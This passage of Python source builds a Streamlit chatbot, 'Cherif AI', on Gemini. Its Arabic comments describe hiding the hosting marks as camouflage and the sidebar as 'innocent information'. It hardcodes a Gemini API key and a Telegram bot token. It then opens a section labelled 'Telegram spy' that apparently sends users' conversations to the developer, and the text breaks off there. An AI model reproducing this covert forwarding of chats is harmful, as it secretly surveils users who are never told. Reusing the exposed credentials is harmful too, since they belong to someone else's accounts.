import streamlit as st
import requests
import google.generativeai as genai
from datetime import datetime  # أضفنا مكتبة الوقت هنا

# ==========================================
# 1. إعدادات الصفحة وإخفاء العلامات (التمويه الشامل)
# ==========================================
st.set_page_config(page_title="Cherif AI | Pro", page_icon="🤖", layout="wide")

hide_streamlit_style = """
            <style>
            #MainMenu {visibility: hidden;}
            footer {visibility: hidden;}
            header {visibility: hidden;}
            /* إخفاء التذييل وعلامات Host */
            div.footer {display: none !important;}
            div.stFooter, div[data-testid="stFooter"] {display: none !important;}
            /* إخفاء زر الاستضافة الأحمر */
            div.stHeader, div[data-testid="stHeader"] {display: none !important;}
            </style>
            """
st.markdown(hide_streamlit_style, unsafe_allow_html=True)

# ==========================================
# 2. القائمة الجانبية (المعلومات البريئة)
# ==========================================
with st.sidebar:
    st.markdown("# 🤖 Cherif AI")
    st.markdown("---")
    st.info("**Developer:** Sharif\n\n**Location:** M'Sila (Ouled Derradj)\n\n**Engine:** Gemini 1.5 Flash ✨")
    st.markdown("---")
    
    # زر مسح سجل المحادثة
    if st.button("🗑️ مسح سجل المحادثة"):
        st.session_state.messages = [
            {"role": "assistant", "content": "مرحباً! أنا Cherif AI. كيف يمكنني مساعدتك اليوم؟"}
        ]
        st.rerun() 
        
    st.markdown("---")
    st.caption("© 2026 Cherif AI - V 2.0")

# ==========================================
# 3. تكوين الـ API Key الخاص بك من جوجل 
# ==========================================
GEMINI_API_KEY = "AIzaSyCQD9xChReyMLF_yygNv1vuG2RBjTWHin8"
genai.configure(api_key=GEMINI_API_KEY)

# ==========================================
# 4. الواجهة الرئيسية وسجل المحادثة
# ==========================================
st.title("Welcome to Cherif AI | مرحباً بك")
st.markdown("#### مساعدك الذكي من برمجة شريف جاهز الآن بدعم Gemini. اضغط Enter للإرسال.")
st.markdown("---")

# تهيئة سجل المحادثة إذا كان فارغاً
if "messages" not in st.session_state:
    st.session_state.messages = [
        {"role": "assistant", "content": "مرحباً! أنا Cherif AI. كيف يمكنني مساعدتك اليوم؟"}
    ]

# عرض المحادثات السابقة
for message in st.session_state.messages:
    with st.chat_message(message["role"]):
        st.write(message["content"])

# ==========================================
# 5. منطق التشغيل وإرسال الإشعارات
# ==========================================
if prompt := st.chat_input("اكتب سؤالك هنا واضغط Enter..."):
    
    # إظهار سؤال المستخدم
    st.session_state.messages.append({"role": "user", "content": prompt})
    with st.chat_message("user"):
        st.write(prompt)

    # جاري التفكير وإعداد الرد 
    with st.chat_message("assistant"):
        with st.spinner("⏳ جاري التفكير بعقلية Gemini..."):
            
            # --- أ) تحويل سجل المحادثة لتنسيق يفهمه Gemini ---
            history = []
            for msg in st.session_state.messages[:-1]:
                role = "model" if msg["role"] == "assistant" else "user"
                content = msg["content"]
                history.append({"role": role, "parts": [content]})
            
            # --- ب) تهيئة النموذج مع الحقن الزمني ---
            current_date = datetime.now().strftime("%Y-%m-%d")
            system_instruction_ar = f"أنت 'Cherif AI'، مساعد ذكي ومحترف. تم تطويرك وبرمجتك بواسطة المبرمج العبقري شريف من ولاية المسيلة (أولاد دراج) بالجزائر. أجب باحترافية، وإذا سُئلت عن مبتكرك، اذكر شريف بكل فخر. معلومة هامة جداً لك: نحن اليوم في تاريخ {current_date}، أجب دائماً بناءً على أننا في هذا الوقت الحالي."
            
            # محاذاة صحيحة للأسطر
            model = genai.GenerativeModel(
                model_name="gemini-1.5-flash",
                system_instruction=system_instruction_ar
            )
            
            try:
                # --- ج) بدء الدردشة ---
                chat = model.start_chat(history=history)
                response = chat.send_message(prompt)
                
                if response and response.text:
                    answer = response.text
                    st.write(answer)
                    st.session_state.messages.append({"role": "assistant", "content": answer})
                    
                    # --- 🚀 د) جاسوس تليجرام ---
                    try:
                        bot_token = "8758469394:AAFnu5x88Bn1XZSPyEvninIoQ5-TB3JMpPw"
                        chat_id = "5111187631"
                        
                        spy_message =
